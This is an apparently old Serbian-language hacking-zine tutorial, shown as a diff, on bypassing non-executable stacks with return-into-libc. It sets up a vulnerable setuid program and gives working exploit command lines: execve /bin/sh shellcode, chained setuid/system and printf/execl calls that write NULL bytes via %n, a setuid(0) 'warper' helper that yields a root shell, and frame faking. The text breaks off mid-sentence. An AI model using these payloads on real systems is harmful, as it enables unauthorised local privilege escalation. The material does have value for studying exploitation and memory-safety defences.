@@ -1,0 +1,827 @@
+
+                             ...................
+                       ...::: phearless zine #3 :::...
+
+....................>---[ Exploiting Non-exec Stack ]---<...................
+
+..................>---[ by EArthquake aka Wintermuth ]---<..................
+                                            wintermuth[at]headcoders[dot]net
+
+
+   1. Uvod
+   2. Obicno exploatisanje prelivanja bafera
+   3. Neegzekutabilni stack
+   4. Ret-into-lib(c) metoda (system())
+        4.1 Nalazenje adrese system()
+        4.2 Prosledjivanje argumenata
+        4.3 Nalazenje adrese varijable okruzenja
+        4.4 Prvi ret-into-libc exploit
+        4.5 Problemi
+        4.6 Koriscenje return adrese 
+        4.7 system() problem
+   5. execl() i pisanje NULL bajtova
+        5.1 Prvi local root ret-into-libc exploit
+   6. Izvrsavanje vise od dva poziva ( Frame faking)
+   7. Exploit program 
+   8. Odvod
+   9. Reference
+      
+////////////////////////////////////////////////////////////////////////////
+--==<[ 1. Uvod
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+          
+   Ovaj tekst je namenjen onima koji vec imaju izvesno predznanje o 
+exploitaciji prelivajna bafera. Cilj teksta je da objasni tehnike zaobilazenja 
+naprednih zastita exploitacije prelivanja bafera. Za razumevanje ovog teksta 
+trebalo bi da imate izvesno znanje c-a, rad sa Linux operativnim sistemom i 
+bar osnovno znanje o exploataciji stack-a. Za upucivanje u osnove exploitacije 
+preporucio bih da procitate [1] jer je to odlican uvod. Tekst i svi primeri su 
+radjeni na primeru linux-a i intel x86 arhitekturi jer autor samo to ima :).
+
+////////////////////////////////////////////////////////////////////////////
+--==<[ 2. Obicno exploatisanje prelivanja bafera
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+   Buduci da znate sta je buffer overflow i kako do njega dolazi i da znate 
+kako ga exploitovati dacu samo najprostiji primer. Uzmimo ocigledno ranjiv 
+program vuln1.c:
+
+____<vuln1.c>______
+main(int argc , char *argv[])
+{
+   char buff[5];
+   strcpy(buff,argv[1]); //ocigldeno ranjiva f-cija strcpy 
+   return 0;
+}
+___<vuln1.c/>______
+
+Namestimo program tako da predstavlja nesto interesantno:
+
+earthquake@ono-sendai:~$ gcc vuln1.c -o vuln1
+earthquake@ono-sendai:~$ ./vuln1 blah
+earthquake@ono-sendai:~$ su
+Password:
+bash-2.05b# chown root vuln1
+bash-2.05b# chmod +s vuln1
+bash-2.05b# ls -l vuln1
+-rwsr-sr-x  1 root users 10584 2005-06-21 12:50 vuln1
+bash-2.05b# exit
+exit
+earthquake@ono-sendai:~$
+
+Sada je program suid, sto znaci da se pri pokretanju izvrsava sa root pravima.
+I prosta exploatacija:
+
+earthquake@ono-sendai:~$ export SC=`perl -e 'print "\x90"x100';perl -e 'print "\
+x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\
+x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
+
+Ovim smo stavili nas shellcode (pozajmljen iz Writting Linux Shellcode, 
+phearless eZine #2 by Shatterhand) ispred koga se nalazi sled NOP-ova cisto 
+da osiguramo izvrsenje.
+Sada nam treba adresa varijable okruzenja SC koja sadrzi shellcode.
+To mozemo naci jednostavnim programom:
+
+____<envaddr.c>_____
+int main(int argc , char *argv[])
+{
+char *addr;
+addr = getenv(argv[1]);
+printf("%p\n",addr);
+return 0;
+}
+____<envaddr.c/>____
+
+Dakle adresa SC je:
+
+earthquake@ono-sendai:~$ ./envaddr SC
+0xbffffea6
+
+Naoruzani adresom naseg shellcode-a mozemo exploitati ranjivi program:
+
+earthquake@ono-sendai:~$ ./vuln1 `perl -e 'print "\xa6\xfe\xff\xbf"x10'`
+sh-2.05b# whoami
+root
+sh-2.05b# exit
+exit
+earthquake@ono-sendai:~
+
+Voilla, exploitovali ste program:)
+Ovo nije bas najcistiji primer exploitovanja, ali je namenjen samo 
+podsecanju, jer pretpostavljam da ste citali [1] kao sto sam vec rekao. 
+
+////////////////////////////////////////////////////////////////////////////
+--==<[ 3. Neegzekutabilni stack
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+   Dolazimo do onoga za sta je ovaj tekst zamisljen. Naime,svi stack obicni 
+stack exploiti se baziraju na izvrsenju koda (shellcode-a ) na stack-u. Stoga je 
+logicno da se zabrani izvrsenje koda na mestima gde to nije potrebno (upravo na 
+stack-u). Pojedini operativni sistemi po defaultu imaju neegzekutabilni stack 
+(OpenBSD na primer i Solaris ako se nevaram ). Sto se tice linux-a, na njemu je 
+moguce izvresenje koda na stack-u, ali postoje mnogi patchevi koji to 
+onemogucavaju. Kako je sva radost hakovanja u tome da se setite necega sto se 
+neko drugi pre vas nije setio, cim su se pojavile ovakve zastite, pojavila se
+i tehnika zaobilazenja. Popularno nazvana return into libc tehnika se bazira na 
+libc standardnoj C biblioteki koja sadrzi sve osnovne funkcije, kao sto su 
+printf(),system(),exit()...Ideja je, posto su ove funkcije deljene, i svaki 
+program koji koristi bilo koju od njih poziva odredjeno mesto u libc, napadac 
+uradi to isto samo da preusmeri poziv sa jedne funkcije na neku drugu korisniju.
+Samim tim sto se izvrsenje programa preusmerava u adresu funkcije, nista se 
+ne izvrsava na stack-u i mozete zaobici zastitu, iako je u pojedinim slucajevima 
+mozda cak i bolje koristiti ret-into-libc tehniku, ona ima nekoliko mana u odnosu
+na shellcode tehniku. Ne pruza tako veliku fleksibilnost. Ali postoji resenje za 
+sve.
+
+////////////////////////////////////////////////////////////////////////////
+--==<[ 4. Ret-into-lib(c) metoda
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+   E sad, kako to izgleda u praksi. Pocnimo od najlakeg primera. Kao sto sam
+vec pomenuo, libc sadrzi system() funkciju koja jednostavno uzima jedan argument 
+koji predstavlja putanju do nekog izvrsnog fajla i izvrsava ga kroz /bin/sh 
+(man system za vise informacija).
+
+---< 4.1 Nalazenje adrese system()
+
+   Demonstraciju vrsimo na istom onom ranjivom programu vuln1.c. Ono sto nam
+treba je naravno lokacija system() funkcije. Nju jednostavno mozemo naci 
+pravljenjem nekog bezveze programa, npr:
+
+____<blah.c>____
+main()
+{
+}
+____<blah.c>____
+
+Kompajliramo program i uz pomoc gdb-a saznajemo adresu system().
+
+earthquake@ono-sendai:~$ gcc -o blah blah.c
+earthquake@ono-sendai:~$ gdb -q blah
+Using host libthread_db library "/lib/libthread_db.so.1".
+(gdb) break main
+Breakpoint 1 at 0x804835a
+(gdb) run
+Starting program: /home/earthquake/projects/zajn/blah
+
+Breakpoint 1, 0x0804835a in main ()
+(gdb) p system
+$1 = {<text variable, no debug info>} 0x4006d4a0 <system>
+(gdb)
+(gdb) quit
+The program is running.  Exit anyway? (y or n) y
+earthquake@ono-sendai:~$
+
+   Napomena: ako nije bas najjasnije sta se tacno desava u koriscenju gdb-a
+savetovao bih da procitate man stranicu istog.
+
+---< 4.2 Prosledjivanje argumenata
+
+   Dakle doznali smo da je adresa system() f-je 0x4006d4a0.
+Posto nama treba da se pokrene /bin/sh (da dobijemo shell) argument system() 
+mora biti /bin/sh (u C-u bi to izgledalo system("/bin/sh")).
+Kako da prosledimo argument???
+   Pa,redosled je sledeci: Adresa funkcije u koju se "vracamo"(u ovom 
+slucaju adresa system()), zatim return adresa (gde bi program trebao da nastavi 
+posle izvrsenja funkcije, i najposle argumenti funkcije. TO bi izgledalo ovako:
+
+ _____________________________________________________________________
+|Adresa f-je|return adresa|Argument1|Argument2|Argument3|....
+|___________|_____________|_________|_________|_________|_____________
+
+
+---< 4.3 Nalazenje adrese varijable okruzenja
+
+   Trenutno nam nije bitno gde ce program nastaviti sa radom tako da return 
+adresa moze da bude nesto bezveze.Sada su nam potrebni jos argumenti.Nacin za 
+postavljanje argumenata je u varijablu okruzenja,kao u primeru shellcode-a.
+Dakle:
+
+earthquake@ono-sendai:~$ export ARG="/bin/sh"
+   A posto nam treba njena adresa :
+earthquake@ono-sendai:~$ envaddr ARG
+0xbffffd65
+earthquake@ono-sendai:~$
+
+Naoruzani ovime mozemo da exploitamo vuln1.
+Dakle idemo:
+
+earthquake@ono-sendai:~$./vuln1 `perl -e 'print "A"x28  . "\xa0\xd4\x06\x40AAAA
+\x65\xfd\xff\xbf"'`
+Segmetation fault
+earthquake@ono-sendai:~$
+
+Hmmm, sta se desilo, nismo dobili shell kao sto je trebalo. Zasto?
+E pa, secate se da smo u prvom primeru koristili gomilu NOP-ova, kod 
+neegzekutabilnog stack-a naravno ne mogu se koristiti NOP nizovi i samim tim 
+veca preciznost je potrebna pri exploitanju. Naime,moramo znati tacnu adresu 
+varijable okruzenaj ARG. Kako je precoznost vrlina bitna svakome ko se bavi ovim
+poslom, ajde da vidimo o cemu se radi detaljnije (vec vidim Shatterhand-a kako 
+kaze: "Naso je ko da prica o preciznosti i pedanteriji.":)). Zar nismo koristili 
+nas lepi program envaddr za nalazenje adrese varijable okruzenja? Naravno, jesmo,
+ali je stvar u tome da se adresa koju daje program menja u zavisnosti od duzine
+imena programa. Kao sto se vidi na sledecim primerima:
+
+earthquake@ono-sendai:~$ cp envaddr a
+earthquake@ono-sendai:~$ a ARG
+0xbffffd71
+earthquake@ono-sendai:~$ cp a aa
+earthquake@ono-sendai:~$ aa ARG
+0xbffffd6f
+earthquake@ono-sendai:~$ cp a aaa
+earthquake@ono-sendai:~$ aaa ARG
+0xbffffd6d
+earthquake@ono-sendai:~$
+
+Prosta matematika nam ukazeuje da se adresa varijable pomera sa promenom
+broja slova imena programa i to za 2 po slovu.
+71-6f=2
+71-6d=4
+Sta cemo sad dodjavola? Posto je duzina imena programa koji exploatisemo 
+5, a duzina pomocnog programa envaddr, adresa koja nama treba bice 4 bajta veca.
+Ajd sad da probamo.
+
+bash-2.05b$ envaddr ARG
+0xbffffd65
+
+65+4=69 (napomena: racunanja se vrse sa heksadecimalnim zapisom, sto znaci prvo
+prebacite broj u decimalni pa na njega dodajte 4 pa zatim rezultat prebaacite u 
+heksadecimalni, ili kako god mislite da vam je lakse, kalkulator moze da 
+pomogne dosta :))
+
+----< 4.4 Prvi ret-into-libc exploit
+
+E sad kad znamo potrebnu adresu (0xbffffd69) mozemo lepo da exploitamo 
+program:
+
+earthquake@ono-sendai:~$ ./vuln1 `perl -e 'print "A"x28 , "\xa0\xb4\x06\x40AAAA\
+x69\xfd\xff\xbf"'`
+sh-2.05b$ 
+
+Wow, dobili smo ono sto smo hteli, idi trci kod drugara da mu se pohvalis. 
+Ali, ovo ipak nije ono sto je nama trebalo. Probaj whoami.
+
+sh-2.05b$ whoami
+earthquake
+
+Nismo dobili root-a iako je ono suid program. Ajd sad probaj exit.
+
+sh-2.05b$ exit
+exit
+Segmentation fault
+
+---< 4.5 Problemi
+
+   Program se rusi pri izlasku iz sh zbog toga sto smo na mesto return
+adrese stavili gluposti.
+   U cemu je problem, zasto nismo dobili root? Da ste procitali man 
+stranicu za system() kao sto sam predlozio vec bi znali(cast izuzetcima). Naime,
+system() sve pokrece kroz /bin/sh i ispusta privilegije. Docicemo i do resenja 
+ovog problema.
+
+---< 4.6 Koriscenje return adrese 
+
+   Ajmo malo da se pozabavimo onom return adresom. Na njeno mesto treba da 
+ide adresa funkcije koja bi se izvrsila nakon system(). Kako program nije imao 
+gde da se "vrati" on se jednostavno srusio. Ajde da napravimo da se lepo ugasi.
+   Za to mozemo naravno iskoristiti exit() funkciju. Adresu exit() funkcije
+nalazimo isto kao i adresu system() funkcije. Dakle:
+
+earthquake@ono-sendai:~$ gdb blah -q
+Using host libthread_db library "/lib/libthread_db.so.1".
+(gdb) break main
+Breakpoint 1 at 0x804838a
+(gdb) run
+Starting program: /home/earthquake/projects/zajn/blah
+
+Breakpoint 1, 0x0804838a in main ()
+(gdb) p exit
+$1 = {<text variable, no debug info>} 0x40054600 <exit>
+(gdb)
+
+Ako nemate srece kao sto ja nemam moze vam se desiti da vam adresa 
+funkcije sadrzi NULL bajtove (NULL bajtovi se oznacavaju kao 00 odnosno \x00)
+koji bi prerano zavrsili string i exploitanje nebi uspelo(pri exploitanju to bi 
+izgledalo \x00\x46\x05\x40). Da bih ipak demonstrairao, koristicu drugu masinu.
+
+bash-2.05b$ gdb blah -q
+Using host libthread_db library "/lib/libthread_db.so.1".
+(gdb) break main
+Breakpoint 1 at 0x804838a
+(gdb) run
+Starting program: /home/earthquake/projects/zajn/blah
+
+Breakpoint 1, 0x0804838a in main ()
+(gdb) p exit
+1 = {<text variable, no debug info>} 0x4005464f <exit>
+(gdb) quit
+The program is running.  Exit anyway? (y or n) y
+bash-2.05b$
+
+Sada nam je adresa exit() 0x4005464f (dakle nema NULL bajtova) i mozemo 
+da nastavimo.
+
+bash-2.05b$ ./vuln1 `perl -e 'print "A"x28 , "\xa0\xb4\x06\x40\x4f\x46\x05\x40\x
+69\xfd\xff\xbf"'`
+sh-2.05b$ exit
+exit
+bash-2.05b$
+
+Kao sto vidimo,program je elegantno zavrsio sa radom vrativsi se na exit().
+
+---< 4.7 system() problem
+
+   Ostaje nam problem sto ne dobijamo root. Bez dobijanja root-a sve ovo je
+dzabe. Postoje nekoliko nacina za resavanje ovog problema.
+   Prvi koji meni pada na pamet je koriscenje jos jedne funkcije setuid()
+za vracanje root prava (man setuid za vise). Uglavnom setuid() za parametar UID 
+odnosno user ID broj na koji treba da postavi prava. Da bi dobili root nama 
+trebaju UID 0 prava. Secate se problema sa NULL bajtovima u adresi exit() 
+funkcije? E pa to i ovde predstavlja problem. Ako bi kao parametar setuid() dali 
+0 imali bi NULL bajtove koji bi prerano zavrsili string i nebi doslo do zeljenog
+efekta. Najmanji broj koji bi mogli da upisemo,a da ne dodje do preranog 
+zavrsetka stringa je 0x01010101  ili 16843009 u decimalnom zapisu. Dakle mnooogo 
+vise nego root UID. Ajde ipak da vidimo kako bi to izgledalo cisto zbog 
+demonstracije. Prvo nam treba adresa setuid() funkcije:
+
+earthquake@ono-sendai:~/projects/zajn$ gdb blah -q
+Using host libthread_db library "/lib/libthread_db.so.1".
+(gdb) break main
+Breakpoint 1 at 0x804838a
+(gdb) run
+Starting program: /home/earthquake/projects/zajn/blah
+
+Breakpoint 1, 0x0804838a in main ()
+(gdb) p system
+$1 = {<text variable, no debug info>} 0x4006b4a0 <system>
+(gdb) p setuid
+$2 = {<text variable, no debug info>} 0x400d5640 <setuid>
+(gdb)
+
+Vidimo da je adresa setuid() funkcije 0x400d5640 kao i da je od system()
+0x4006b4a0. Treba nam jos adresa argumenta za system() koji se nalazi u 
+varijabli okruzenja ARG:
+
+earthquake@ono-sendai:~/projects/zajn$ export ARG="/bin/sh"
+earthquake@ono-sendai:~/projects/zajn$ export ARG="/bin/sh"
+earthquake@ono-sendai:~/projects/zajn$ cp envaddr envad
+earthquake@ono-sendai:~/projects/zajn$ envad ARG
+0xbffffd69
+earthquake@ono-sendai:~/projects/zajn$
+
+Primetili ste da sam promenio ime programa za ispisivanje adrese. To je 
+iz prostog razloga sto me mrzi da dodajem 4 zbog razlike u imenima, pa posto je 
+ime ranjivog programa dugo 5 slova i ime programa je dugo 5 slova i sada nema 
+potrebe za kalkulacijama.
+Posto smo nabavili sve sto nam treba, pocnimo s exploitanjem:
+
+earthquake@ono-sendai:~/projects/zajn$ ./vuln1 `perl -e 'print "A"x28 . "\x40\x5
+6\x0d\x40\xa0\xb4\x06\x40\x01\x01\x01\x01\x69\xfd\xff\xbf"'`
+sh-2.05b$ id
+uid=1000(earthquake) gid=100(users) groups=100(users)
+sh-2.05b$ exit
+exit
+Segmentation fault
+earthquake@ono-sendai:~/projects/zajn$ 
+
+Prvo ide adresa setuid(), zatim adresa system(), potom setuid argument
+(0x01010101)i na kraju system() argument (adresa ARG). Naravno kao sto nismo ni 
+ocekivali i dalje nemamo root shell ali smo vezali dve funkcije koje uzimaju 
+argumente. Jaka stvar kazete vi ali videcete, bice koristi i od ovoga. Bice kad vam
+kazem, ali ne, nemorate da me slusate, sada verovatno mislite da sam poludeo, pa sta
+i da jesam a? BU BUUUUUUU BLALALLALALRALALRL!!!
+
+Ne obracajte paznju na ovog gore, to je samo bedni pokusaj mog mozga da me 
+natera da odem da ga ubijem alkoholom,sto mu ovom prilikom i obecavam samo 
+jos par stvari.
+Elem,postoji jos jedan nacin da ne dobijete nista za sada, ali ajde da 
+spomenemo i njega, bice koristi od nejga u buducnosti. Neki ljudi ga bas cene mada
+meni izgleda bezveze ali ajde. Naime,stos je u tome da koristimo pomocni program.
+Zovimo ga warper:
+
+______<warper.c>___________
+
+main()
+{
+setuid(0);
+setgid(0);
+system("/bin/sh");
+}
+_____</warper.c>__________
+
+Kao sto vec vidite ovaj program u osnovi stavlja UID i GID na 0 ako za 
+to ima prava, a ako ga pokrene suid program imace prava :). Koristimo ga preko 
+varijable okruzenja. Dakle:
+
+earthquake@ono-sendai:~/projects/zajn$ gcc warper.c -o warper
+earthquake@ono-sendai:~/projects/zajn$ export ARG="/home/earthquake/projects/zaj
+n/warper"
+earthquake@ono-sendai:~/projects/zajn$ envad ARG
+0xbffffd4b
+
+Posto nema potrebe za kalkulacijama adresa je 0xbffffd4b.
+I exploitovanje moze da se nastavi:
+
+earthquake@ono-sendai:~/projects/zajn$ ./vuln1 `perl -e 'print "A"x28 , "\xa0\xb
+4\x06\x40AAAA\x4b\xfd\xff\xbf"'`
+sh-2.05b$ whoami
+earthquake
+sh-2.05b$ exit
+exit
+Segmentation fault
+earthquake@ono-sendai:~/projects/zajn$ 
+
+Opet nismo dobili root shell. Zato sto smo opet koristili system().
+Izgleda da nema resenja ovom system() problemu. Varate se, ili se ja varam
+nebitno. Uglavnom vara se onaj ko misli da nema resenja. Docicemo vec do njega.
+
+////////////////////////////////////////////////////////////////////////////
+--==<[ 5. execl() i pisanje NULL bajtova
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+   Postoji cela grana funkcija koje pored system() zamenjuju trenutni 
+proces drugim. execl() izgleda ovako :
+
+    int execl(const char *path, const char *arg, ...);
+
+Procitajte man stranicu za vise. Dakle,uzima kao parametre pokazivac na 
+NULL terminirani string koji iznacava putanju do programa, zatim pokazivace ka 
+takodje NULL terminiranim stringovima koji predstavljaju argumente tog programa
+(prvi agrument bi bio sam program kao sto u C-u argv[0] predstavlja sam program
+a ostali bi bili argumenti programu), i na kraju mora da se nalazi NULL iliti 0
+da bi zavrsio niz pokazivaca na argumente. Kao sto vec vidite opet imamo 0 koji 
+je u ovom slucaju neophodan i koji ce nam izgleda zadavati dosta muka. Nas 
+problem mozemo da resim koristeci printf() funkciju (man 3 printf za vise).
+Mozemo koristiti njen parametar za formatiranje stringova %n da zapisemo 4 NULL
+bajta koji su nam potrebni.Kako? Tako sto cemo iskoristiti printf() i njene 
+format string parametre tako da preskoci drugi i treci argument. Posto je 
+poslednji argument njegova adresa bice prepisan sa 4 NULL bajta. Kao i ranije 
+zatim se izvrsava execl() poziv koji sada ima 3 argumenta koji mu trebaju.
+Ajd da vidimo dal ce to da uspe. Prvo nam treba adresa printf() i adresa execl():
+
+earthquake@ono-sendai:~/projects/zajn$ gdb blah -q
+Using host libthread_db library "/lib/libthread_db.so.1".
+(gdb) break main
+Breakpoint 1 at 0x804838a
+(gdb) run
+Starting program: /home/earthquake/projects/zajn/blah
+
+Breakpoint 1, 0x0804838a in main ()
+(gdb) p printf
+$1 = {<text variable, no debug info>} 0x4007b280 <printf>
+(gdb) p execl
+$1 = {<text variable, no debug info>} 0x400d4e50 <execl>
+(gdb)
+
+Zatim nam treba adresa ARG koji sadrzi putanju do programa koji 
+pokrecemo(/bin/sh u ovom slucaju)
+
+earthquake@ono-sendai:~/projects/zajn$ export ARG="/bin/sh"
+earthquake@ono-sendai:~/projects/zajn$ envad ARG
+0xbffffd60
+earthquake@ono-sendai:~/projects/zajn$
+
+E sad trebace nam jos jedna adresa da bi ovo mogli da izvedemo. To je 
+adresa gde ce se nalaziti sve ovo u memoriji (sve ove adrese, ceo ret-into-libc
+plus broj karakteri potrebni za prelivanje bafera). To je adresa samog bafera 
+plus 28 zbog onih potrebnih karaktera za prelivanje bafera i plus 20(duzina 
+ret-into-libc sleda). Problem je kako doci do te adrese. Jos uvek nisam nasao neki 
+lepsi nacin od ovog tako da cemo morati da ga koristimo. Naime,dodacemo jedan red
+u sam ranjivi program koji ce nam reci adresu buff varijable.
+
+____<vuln2.c>______
+main(int argc , char *argv[])
+{
+   char buff[5];
+   printf("%p\n",buff); //linija koja ce nam reci gde se nalazi buff
+   strcpy(buff,argv[1]); //ocigleno ranjiva f-cija strcpy 
+   return 0;
+}
+___<vuln2.c/>______
+ 
+Kako se adresa buff varijable menja u zavisnosti od duzine argumenta 
+programa stavicemo odmah duzinu argumenta da bude ista kao ona koju cemo 
+koristiti u exploitovanju. Duzina je 52 bajta.
+
+earthquake@ono-sendai:~/projects/zajn$ ./vuln2 `perl -e 'print "A"x52'`
+0xbffff690
+Segmentation fault
+earthquake@ono-sendai:~/projects/zajn$
+
+Kao sto sam vec rekao treba dodati 28 i 20 na adresu da bi dobili potrebnu.
+
+90+28+20=C0
+
+Znaci adresa je 0xbffff6c0. Jos nam samo fali adresa foramt stringa.
+
+earthquake@ono-sendai:~/projects/zajn$ export FMT="%3\$n"
+earthquake@ono-sendai:~/projects/zajn$ envad FMT
+0xbfffffa7
+
+Sada imamo sve sto nam je potrebno za exploitovanje. Prvo ide adresa printf() 
+zatim adresa execl(),zatim adresa format stringa, pa onda adresa ARG, pa
+jos jednom addresa argumenta(po vec objasnjenim pravilima za execl()) i na kraju
+adresa bafera:
+
+earthquake@ono-sendai:~/projects/zajn$ ./vuln1 `perl -e 'print "A"x28 . "\x80\xb
+2\x07\x40\x50\x4e\x0d\x40\xa7\xff\xff\xbf\x60\xfd\xff\xbf\x60\xfd\xff\xbf\xc0\xf
+6\xff\xbf"'`
+sh-2.05b$ whoami
+earthquake
+sh-2.05b$
+
+Opet nismo dobili root. Ali smo uspeli da upisemo NULL bajtove koji su 
+nam bili potrebni. Da vidimo sta se ovde upravo dogodilo. Nas niz izgleda ovako:
+
+ ___________________________________________________________________________
+|adresa printf()|adresa execl()|adresa FMT|adresaARG |adresa ARG|adresa buff|
+|_______________|______________|__________|__________|__________|___________|
+
+I sta se sad desava? Izvrsava se printf() koji za prvi argument ima nas 
+format string koji mu kaze da skoci na svoj treci argument (radi ilustrovanja to 
+bi u C-u izgledalo ovako printf("%3\$n", ARG addresa, ARG adresa, buff adresa)),
+a posto je on sama adresa bafera, tu upisuje 4 NULL bajta, zatim se tok programa 
+vraca na execl() koji sada kao argumente vidi dve adrese ARG i na kraju, treci 
+argument 4 NULL bajta koji su potrebni za zavrsavanje niza argumenata i sve se 
+odvija fino. Za pisanje NULL bajtova pogodne su jos pojedine funkcije, kao 
+strcpy() na prmer ili sprintf(). Demonstrairao sam koriscenje printf() za pisanje
+NULL bajtova, tako da vam verovatno koriscenje drugih funkcija nece biti 
+problem.
+
+---< 5.1 Prvi local root ret-into-libc exploit
+
+Sve je to lepo ali mi idalje nemamo root, setite se onog warper programa,
+nisam dzabe pricao o njemu:). Ajde umesto /bin/sh da argument bude putanja do 
+warper programa. Znaci ovako:
+
+earthquake@ono-sendai:~/projects/zajn$ export ARG="/home/earthquake/projects/zaj
+n/warper"
+earthquake@ono-sendai:~/projects/zajn$ envad ARG
+0xbffffd42
+
+Sada samo adresu ARG zamenimo:
+
+earthquake@ono-sendai:~/projects/zajn$ ./vuln1 `perl -e 'print "A"x28 . "\x80\xb
+2\x07\x40\x50\x4e\x0d\x40\xa7\xff\xff\xbf\x42\xfd\xff\xbf\x42\xfd\xff\xbf\xc0\xf
+6\xff\xbf"'`
+sh-2.05b# whoami
+root
+sh-2.05b# exit
+exit
+earthquake@ono-sendai:~/projects/zajn$
+
+Napokon root!!! Sta se sada desilo? Pa za razliku od prethodnog primera 
+sada smo pokrenuli warper program koji prvo radi setuid() i setgid() na 0 
+odnosno root UID i GID i zatim izvrsava system("/bin/sh") koji sada ima root 
+prava i mi smo dobili root. E sad, moram priznati da ovo sa warper programom nije
+bas najelegantnije resenje, zasto nebismo vezali vise od dva poziva i napravili 
+da nas ret-into-libc exploit sam vraca privilegije? Pa kao sto vidite nemoguce je
+pokrenuti vise od dva poziva. Naravno da nije nemoguce, postoji nekoliko nacina 
+za ovo. U sledecem poglavlju cu objasniti kako.
+
+////////////////////////////////////////////////////////////////////////////
+--==<[ 6. Izvrsavanje vise od dva poziva ( Frame faking)
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+   Mana ret-into-libc tehnike je to sto je moguce izvrsiti samo dva poziva
+sto u nekim situacijama nije dovoljno. Postoje pojedine tehnike vezivanja vise 
+poziva. Frame faking je jedna od njih koja je najlaksa za upotrebu. Dakle 
+postavljamo onoliko laznih frejmova koliko poziva zelimo. U nastavku opis 
+vezivanja tri poziva.
+   Detaljnije, na EBP se postavlja adresa svakog sledeceg laznog frejma, dok
+EIP pokazuje na funkciju koja se izvrsava, return adresa iz laznog frejma 
+pokazuje na LEAVE i RET instrukcije. LEAVE uzima sa EBP-a adresu sledeceg laznog 
+okvira i stavlja je u ESP, a RET iz ESP uzima adresu koja se postavlja u EIP i 
+izvrsenje se nastavlja tu. LEAVE i RET instrukcije su prisutne u svim programima
+kompajliranim GCC-om i sluze za vec opisanu stvar. LEAVE i RET se nalaze obicno 
+na kraju funkcije programa, tako da njihovo nalazenje nije neki problem. Kroz 
+gdb to bi bilo ovako:
+
+bash-2.05b$ gdb -q vuln1
+Using host libthread_db library "/lib/libthread_db.so.1".
+(gdb) disas main
+Dump of assembler code for function main:
+0x08048384 <main+0>:    push   %ebp
+0x08048385 <main+1>:    mov    %esp,%ebp
+0x08048387 <main+3>:    sub    $0x18,%esp
+0x0804838a <main+6>:    and    $0xfffffff0,%esp
+0x0804838d <main+9>:    mov    $0x0,%eax
+0x08048392 <main+14>:   sub    %eax,%esp
+0x08048394 <main+16>:   sub    $0x8,%esp
+0x08048397 <main+19>:   mov    0xc(%ebp),%eax
+0x0804839a <main+22>:   add    $0x4,%eax
+0x0804839d <main+25>:   pushl  (%eax)
+0x0804839f <main+27>:   lea    0xffffffe8(%ebp),%eax
+0x080483a2 <main+30>:   push   %eax
+0x080483a3 <main+31>:   call   0x80482b0 <_init+56>
+0x080483a8 <main+36>:   add    $0x10,%esp
+0x080483ab <main+39>:   mov    $0x0,%eax
+0x080483b0 <main+44>:   leave
+0x080483b1 <main+45>:   ret
+0x080483b2 <main+46>:   nop
+0x080483b3 <main+47>:   nop
+0x080483b4 <main+48>:   nop
+0x080483b5 <main+49>:   nop
+0x080483b6 <main+50>:   nop
+0x080483b7 <main+51>:   nop
+0x080483b8 <main+52>:   nop
+0x080483b9 <main+53>:   nop
+0x080483ba <main+54>:   nop
+0x080483bb <main+55>:   nop
+0x080483bc <main+56>:   nop
+0x080483bd <main+57>:   nop
+0x080483be <main+58>:   nop
+0x080483bf <main+59>:   nop
+End of assembler dump.
+(gdb)
+
+Znaci adresa koja nama treba je 0x080483b0. Dalje nam treba adresa EBP-a
+koju prepisujemo adresom drugog frame-a. Nju nalazimo pomocu gdb-a:
+
+bash-2.05b$ gdb vuln1 -q
+Using host libthread_db library "/lib/libthread_db.so.1".
+(gdb) break main
+Breakpoint 1 at 0x804838a
+(gdb) run
+Starting program: /home/earthquake/projects/zajn/vuln1
+
+Breakpoint 1, 0x0804838a in main ()
+(gdb) info regi
+eax            0x1      1
+ecx            0x4      4
+edx            0x40155b40       1075141440
+ebx            0x4015460c       1075136012
+esp            0xbffff680       0xbffff680
+ebp            0xbffff698       0xbffff698
+esi            0x40014900       1073826048
+edi            0xbffff6e4       -1073744156
+eip            0x804838a        0x804838a
+eflags         0x200282 2097794
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x0      0
+(gdb) quit
+The program is running.  Exit anyway? (y or n) y
+bash-2.05b$
+
+Dakle potrebna adresa je 0xbffff698. Ali posto sada nismo koristili nikakve 
+argumente programu adresa je za 48 manja nego sto ce biti kada pokrenemo
+exploit. Zasto? Jer korisitmo bafer koji popunjava bafer programa od 24 karaktera
+(2*24=48). Dakle dodamo 48 na 98h i kobijemo c8h. Da vidimo, imamo sve sto nam
+treba. Adresa system() je 0x4006b4a0, adresa LEAVERET instrukcija je 0x080483b0,
+adresa EBP-a je 0xbffff6c8, sta nam jos treba. Argument system() naravno. Kao i do
+sada koristimo varijablu okruzenja ARG:
+
+bash-2.05b$ export ARG="/bin/sh"
+bash-2.05b$ envad ARG 
+0xbffffd4b
+bash-2.05b$
+
+I poslednja stvar koja nam je potrebna je 0xbffffd4b. To bi izgledalo ovako:
+
+ __________________________________________________________________________
+|EBP - 16|system|leaveret|ARG|EBP|system|leaveret|ARG|EBP-16|system|AAAA|ARG|
+|________|______|________|___|___|______|________|___|______|______|____|___|
+
+
+Sta se ovde desava? Izvrsava se system() koji vidi parametar ARG, zatim 
+LEAVERET instrukcije kako je vec opisano, izvrsenje se nastavlja kod drugog 
+system() koji takodje vidi ARG kao parametar, zatim LEAVERET prebacuju 
+egzekuciju na treci system() koji opet koristi ARG kao parametar i zatim se 
